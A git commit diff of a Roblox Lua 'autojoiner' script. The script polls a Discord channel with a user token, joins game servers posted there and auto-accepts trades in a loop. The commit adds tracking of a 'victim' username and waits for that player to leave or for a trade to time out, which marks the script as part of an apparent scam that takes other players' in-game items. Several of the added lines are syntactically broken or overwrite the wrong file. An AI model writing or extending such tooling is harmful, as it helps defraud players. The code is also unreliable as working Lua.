ba792e25ebd729e31a87d370b27bc69ed618a55a
D3ATH-hub <160107361+D3ATH-hub@users.noreply.github.com>
2024-12-22 00:49:11 +0100

    Update autojoiner.lua

--- autojoiner.lua
+++ autojoiner.lua
@@ -1,5 +1,8 @@
+if not channelId or not token then
+    game:GetService("Players").LocalPlayer:kick("add your token or channel id breh")
+end
 if not game:IsLoaded() then
-	game.Loaded:Wait() -- We wait while the game loads
+    game.Loaded:Wait() -- We wait while the game loads
 end
 
 local bb = game:GetService("VirtualUser") -- Anti afk
@@ -12,10 +15,15 @@ game:service "Players".LocalPlayer.Idled:connect(
 
 local HttpServ = game:GetService("HttpService")
 local joinFile = isfile("lastjoin.txt")
+local victimFile = isfile("user.txt")
 if not joinFile then
     writefile("lastjoin.txt", "placeholder")
 end
+if not victimFile then
+    writefile("user.txt", "victime username")
+end
 local LastMsgId = readfile("lastjoin.txt")
+local victimUser = readfile("user.txt")
 local thing = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2'):WaitForChild('Loading')
 while thing.Enabled do
     wait(1) -- We wait while the loading screen is active
@@ -33,13 +41,41 @@ end
 
 local function acceptTrade()
     while task.wait(0.1) do
-        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
+        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(285646582)
     end
 end
-
+local function waitForPlayerLeave()
+    local playerRemovedConnection
+    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+        if removedPlayer.Name == victimUser then
+            if playerRemovedConnection then
+                playerRemovedConnection:Disconnect()
+            end
+            didVictimLeave = true
+        end
+    end)
+end
+local function IsTrading()
+    local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+    if trade_statue == "StartTrade" then
+        return  true
+    elseif trade_statue == "None" then
+        return false
+    end
+end
+local tradeTimer()
+    while task.wait() do
+        if IsTrading() then
+            timer = timer + 1
+            wait(1)
+        elseif not IsTrading()
+            timer = 0
+        end
+    end
+end
 task.spawn(acceptRequest) -- Start accepting trade requests
 task.spawn(acceptTrade) -- Start accepting trades
-
+task.spawn(tradeTimer)
 local function autoJoin()
     local response = request({
         Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=1",
@@ -55,11 +91,14 @@ local function autoJoin()
         local messages = HttpServ:JSONDecode(response.Body)
         if #messages > 0 then
             local placeId, jobId = string.match(messages[1].content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
-
-            if tostring(messages[1].id) ~= LastMsgId and placeId ~= nil then
-                LastMsgId = tostring(messages[1].id)
-                writefile("lastjoin.txt", LastMsgId)
-                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+            local victimeUsername = messages[1].embeds[1].fields[1].value
+            if didVictimLeave or timer > 5 then
+                if tostring(messages[1].id) ~= LastMsgId and placeId ~= nil then
+                    LastMsgId = tostring(messages[1].id)
+                    writefile("lastjoin.txt", LastMsgId)
+                    writefile("lastjoin.txt", victimeUsername)
+                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+                end
             end
         end
     end
